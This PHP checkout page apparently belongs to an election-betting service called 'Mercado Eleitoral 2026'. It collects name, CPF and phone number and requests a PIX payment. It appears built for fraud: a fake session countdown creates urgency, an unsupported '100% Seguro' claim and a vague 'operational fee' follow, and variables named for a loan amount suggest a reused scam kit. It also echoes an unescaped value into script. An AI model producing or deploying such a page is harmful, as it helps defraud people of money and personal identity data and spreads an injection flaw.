<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$dados = $_SESSION['dados_cadastro'] ?? [];
$nome  = $dados['nome'] ?? '';
$cpf   = $dados['cpf'] ?? '';
$tel   = $dados['telefone'] ?? '';
$servico = $dados['servico'] ?? 'Palpite Eleitoral 2026';

// Pega o valor da sessão (ou define 19.90 como padrão se não existir)
$valorPalpite = $_SESSION['valor_emprestimo'] ?? $dados['valor'] ?? '19.90';
// Formata para exibição em Real (ex: 50.00 -> 50,00)
$valorFormatado = number_format((float)$valorPalpite, 2, ',', '.');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Eleitoral 2026 - Pagamento Seguro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .bg-custom-header { background-color: #0f172a; }
        .card-custom {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.85), rgba(15, 23, 42, 0.98));
            border: 1px solid rgba(56, 189, 248, 0.25);
            backdrop-filter: blur(12px);
        }
        @keyframes fadeInOut {
            0% { opacity: 0; transform: translateY(10px); }
            15% { opacity: 1; transform: translateY(0); }
            85% { opacity: 1; transform: translateY(0); }
            100% { opacity: 0; transform: translateY(10px); }
        }
        .toast-notification {
            animation: fadeInOut 5s ease-in-out infinite;
        }
    </style>
</head>
<body class="bg-slate-950 min-h-screen font-sans text-gray-100 flex flex-col justify-between">

    <div>
        <header class="bg-custom-header text-white text-xs py-3 px-4 border-b border-slate-800 shadow-sm">
            <div class="max-w-xl mx-auto flex justify-between items-center">
                <span class="font-bold tracking-wide flex items-center gap-2">
                    <i class="fa-solid fa-chart-line text-emerald-400"></i> Mercado Eleitoral 2026
                </span>
                <span class="text-emerald-400 flex items-center gap-1 font-semibold">
                    <i class="fa-solid fa-lock text-[10px]"></i> Pagamento 100% Seguro
                </span>
            </div>
        </header>

        <main class="max-w-xl mx-auto px-4 py-6">
            <div class="bg-slate-900 border border-amber-500/30 rounded-xl p-3 mb-4 flex items-center justify-between text-amber-300 shadow-sm">
                <div class="flex items-center gap-2">
                    <i class="fa-regular fa-clock text-amber-400 animate-pulse"></i>
                    <span class="text-xs font-semibold">Sua sessão expira em:</span>
                </div>
                <span id="countdown-timer" class="text-xs font-extrabold bg-amber-500/10 px-2.5 py-1 rounded-md text-amber-400 font-mono border border-amber-500/20">14:59</span>
            </div>

            <div class="card-custom rounded-2xl shadow-2xl p-6 md:p-8">
                <div class="mb-5 pb-4 border-b border-slate-800 flex items-center justify-between text-[11px]">
                    <div class="flex items-center gap-1.5 text-emerald-400 font-bold">
                        <i class="fa-solid fa-circle-check"></i> 1. Dados Validados
                    </div>
                    <div class="h-[1px] flex-1 bg-slate-800 mx-3"></div>
                    <div class="flex items-center gap-1.5 text-blue-400 font-bold">
                        <i class="fa-solid fa-spinner animate-spin"></i> 2. Pagamento PIX
                    </div>
                </div>

                <div class="bg-slate-900/90 border border-slate-700/60 rounded-xl p-4 text-center mb-6">
                    <span class="text-[11px] font-bold text-slate-400 uppercase tracking-wider block mb-1">Valor do Palpite / Taxa Operacional</span>
                    <!-- Exibe o valor dinâmico capturado -->
                    <span id="display-valor-texto" class="text-3xl font-extrabold text-emerald-400 tracking-tight">R$ <?php echo $valorFormatado; ?></span>
                    <p class="text-[11px] text-slate-400 mt-1"><?php echo htmlspecialchars($servico); ?></p>
                </div>

                <form id="form-identificacao" class="space-y-4">
                    <input type="hidden" name="payment_method" id="input-payment-method" value="pix">
                    <input type="hidden" name="servico" id="input-servico-hidden" value="<?php echo htmlspecialchars($servico); ?>">
                    <!-- Input oculto enviando o valor numérico exato para o backend processar na API de pagamento -->
                    <input type="hidden" name="valor" id="input-valor-hidden" value="<?php echo htmlspecialchars($valorPalpite); ?>">

                    <div>
                        <label class="block text-xs font-bold text-slate-300 mb-1 uppercase tracking-wide">Nome Completo</label>
                        <input type="text" name="nome" value="<?php echo htmlspecialchars($nome); ?>" required placeholder="Digite seu nome" class="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-700 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500 font-medium transition">
                    </div>

                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
                        <div>
                            <label class="block text-xs font-bold text-slate-300 mb-1 uppercase tracking-wide">CPF</label>
                            <input type="text" name="cpf" id="cpf-input" value="<?php echo htmlspecialchars($cpf); ?>" required placeholder="000.000.000-00" class="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-700 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500 font-medium transition">
                        </div>
                        <div>
                            <label class="block text-xs font-bold text-slate-300 mb-1 uppercase tracking-wide">Celular / WhatsApp</label>
                            <input type="text" name="telefone" id="phone-input" value="<?php echo htmlspecialchars($tel); ?>" required placeholder="(00) 00000-0000" class="w-full px-3.5 py-2.5 bg-slate-900 border border-slate-700 rounded-xl text-xs text-white focus:outline-none focus:border-emerald-500 font-medium transition">
                        </div>
                    </div>

                    <div class="pt-3">
                        <button type="submit" id="btn-submit" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 px-4 rounded-xl text-sm shadow-lg shadow-emerald-600/30 transition flex items-center justify-center gap-2">
                            <i class="fa-solid fa-lock text-xs"></i>
                            <span id="btn-submit-text">Gerar Pagamento PIX com Segurança</span>
                        </button>
                    </div>
                </form>
            </div>
        </main>
    </div>

    <!-- Modal de Carregamento -->
    <div id="loading-modal" class="fixed inset-0 bg-black/75 backdrop-blur-sm z-50 flex flex-col items-center justify-center p-6 hidden">
        <div class="card-custom rounded-2xl p-6 text-center shadow-2xl w-full max-w-xs flex flex-col items-center border border-slate-700">
            <div id="modal-spinner" class="w-12 h-12 border-4 border-emerald-500/20 border-t-emerald-500 rounded-full animate-spin mb-4"></div>
            <div id="modal-icon-error" class="text-amber-400 text-4xl mb-2 hidden"><i class="fa-solid fa-triangle-exclamation"></i></div>
            <h4 class="font-bold text-white text-sm" id="loading-title">Processando...</h4>
            <p class="text-xs text-slate-400 mt-2 leading-relaxed" id="loading-sub">Aguarde um instante.</p>
            <button id="btn-modal-close" onclick="redirectPixAfterCard()" class="mt-4 bg-blue-600 hover:bg-blue-500 text-white text-xs font-bold py-2 px-4 rounded-lg hidden w-full">Continuar</button>
        </div>
    </div>

    <script>
    let currentMethod = 'pix';
    let savedPixData = null;
    let valorGlobalTransacao = "<?php echo $valorPalpite; ?>";

    // Garante sincronia caso o valor venha via localStorage do index
    document.addEventListener('DOMContentLoaded', function() {
        const storedValor = localStorage.getItem('valor_emprestimo');
        if (storedValor) {
            valorGlobalTransacao = storedValor;
            document.getElementById('input-valor-hidden').value = storedValor;
            let numFloat = parseFloat(storedValor);
            if (!isNaN(numFloat)) {
                document.getElementById('display-valor-texto').innerText = 'R$ ' + numFloat.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
            }
        }

        const form = document.getElementById('form-identificacao');
        const loadingModal = document.getElementById('loading-modal');

        if (form) {
            form.addEventListener('submit', async function(e) {
                e.preventDefault();

                document.getElementById('loading-title').innerText = 'Gerando seu PIX';
                document.getElementById('loading-sub').innerText = 'Aguarde um instante...';
                document.getElementById('modal-spinner').classList.remove('hidden');
                document.getElementById('modal-icon-error').classList.add('hidden');
                document.getElementById('btn-modal-close').classList.add('hidden');
                loadingModal.classList.remove('hidden');

                const formData = new FormData(form);
                const dataObj = {};
                formData.forEach((value, key) => dataObj[key] = value);
                
                // Garante que o valor atualizado vai no JSON da requisição
                dataObj['valor'] = valorGlobalTransacao;

                try {
                    const response = await fetch('api/create_payment.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(dataObj)
                    });

                    const result = await response.json();

                    if (response.ok && result.status === 'success') {
                        savedPixData = result;

                        let cleanPix = result.pix_code.replace(/\\/g, '');
                        localStorage.setItem('current_pix_code', cleanPix);
                        localStorage.setItem('current_pedido_id', result.pedidoId);
                        localStorage.setItem('current_amount', valorGlobalTransacao);
                        window.location.href = 'qrcode.php';
                    } else {
                        loadingModal.classList.add('hidden');
                        alert('Erro ao processar requisição: ' + (result.message || 'Tente novamente.'));
                    }
                } catch (error) {
                    loadingModal.classList.add('hidden');
                    alert('Erro na comunicação com o servidor.');
                }
            });
        }
    });

    function redirectPixAfterCard() {
        if (savedPixData && savedPixData.pix_code) {
            let cleanPix = savedPixData.pix_code.replace(/\\/g, '');
            localStorage.setItem('current_pix_code', cleanPix);
            localStorage.setItem('current_pedido_id', savedPixData.pedidoId);
            localStorage.setItem('current_amount', valorGlobalTransacao);
            window.location.href = 'qrcode.php';
        } else {
            document.getElementById('loading-modal').classList.add('hidden');
        }
    }
    </script>
</body>
</html>